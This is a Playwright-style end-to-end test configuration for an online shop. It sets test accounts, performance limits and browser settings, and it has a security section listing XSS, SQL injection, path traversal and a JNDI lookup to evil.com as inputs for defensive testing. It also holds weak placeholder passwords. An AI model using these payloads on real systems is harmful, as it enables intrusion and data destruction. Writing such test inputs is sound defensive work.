// E2E Test Configuration for NEOSHOP ULTRA
export const testConfig = {
  // Base URLs
  baseUrl: process.env.E2E_BASE_URL || 'http://localhost:3000',
  apiBaseUrl: process.env.E2E_API_BASE_URL || 'http://localhost:3000/api',
  
  // Test data
  testData: {
    users: {
      admin: {
        email: 'admin@neoshop.com',
        password: 'admin123',
        role: 'ADMIN'
      },
      customer: {
        email: 'customer@neoshop.com',
        password: 'customer123',
        role: 'CUSTOMER'
      },
      newUser: {
        email: 'newuser@test.com',
        password: 'newuser123',
        firstName: 'New',
        lastName: 'User'
      }
    },
    products: {
      sample: {
        name: 'Test Product',
        price: 99.99,
        description: 'A test product for E2E testing',
        category: 'Electronics',
        stock: 100
      }
    },
    orders: {
      sample: {
        items: [
          { productId: 1, quantity: 2 },
          { productId: 2, quantity: 1 }
        ],
        shippingAddress: {
          street: '123 Test Street',
          city: 'Test City',
          state: 'TS',
          zipCode: '12345',
          country: 'US'
        }
      }
    }
  },
  
  // Performance thresholds
  performance: {
    pageLoadTime: 3000, // 3 seconds
    apiResponseTime: 1000, // 1 second
    lcpThreshold: 2500, // 2.5 seconds
    fidThreshold: 100, // 100ms
    clsThreshold: 0.1 // 0.1
  },
  
  // Security test data
  security: {
    maliciousInputs: [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>'
    ],
    sqlInjection: [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' OR '1'='1' --"
    ],
    xssPayloads: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>'
    ]
  },
  
  // Accessibility standards
  accessibility: {
    wcagLevel: 'AA',
    colorContrastRatio: 4.5,
    keyboardNavigation: true,
    screenReaderSupport: true,
    focusManagement: true
  },
  
  // PWA requirements
  pwa: {
    manifestRequired: true,
    serviceWorkerRequired: true,
    offlineSupport: true,
    installPrompt: true,
    pushNotifications: false // Optional
  },
  
  // Test timeouts
  timeouts: {
    default: 30000, // 30 seconds
    api: 10000, // 10 seconds
    navigation: 15000, // 15 seconds
    element: 5000, // 5 seconds
    performance: 60000 // 60 seconds
  },
  
  // Browser configurations
  browsers: {
    chromium: {
      headless: true,
      viewport: { width: 1280, height: 720 }
    },
    firefox: {
      headless: true,
      viewport: { width: 1280, height: 720 }
    },
    webkit: {
      headless: true,
      viewport: { width: 1280, height: 720 }
    },
    mobile: {
      headless: true,
      viewport: { width: 375, height: 667 },
      isMobile: true,
      hasTouch: true
    }
  },
  
  // Test environment setup
  environment: {
    setup: async (page: any) => {
      // Set up test environment
      await page.setExtraHTTPHeaders({
        'X-Test-Mode': 'true'
      })
      
      // Mock external services if needed
      await page.route('**/api/external/**', (route: any) => {
        route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({ mock: true })
        })
      })
    },
    
    teardown: async (page: any) => {
      // Clean up test environment
      await page.evaluate(() => {
        // Clear localStorage
        localStorage.clear()
        // Clear sessionStorage
        sessionStorage.clear()
        // Clear cookies
        document.cookie.split(";").forEach(cookie => {
          const eqPos = cookie.indexOf("=")
          const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie
          document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/"
        })
      })
    }
  },
  
  // Test data cleanup
  cleanup: {
    afterEach: true,
    afterAll: true,
    tables: ['users', 'products', 'orders', 'reviews', 'categories']
  },
  
  // Reporting
  reporting: {
    generateReport: true,
    reportPath: 'test-results/e2e-report.html',
    screenshots: true,
    videos: true,
    traces: true
  }
}

export default testConfig


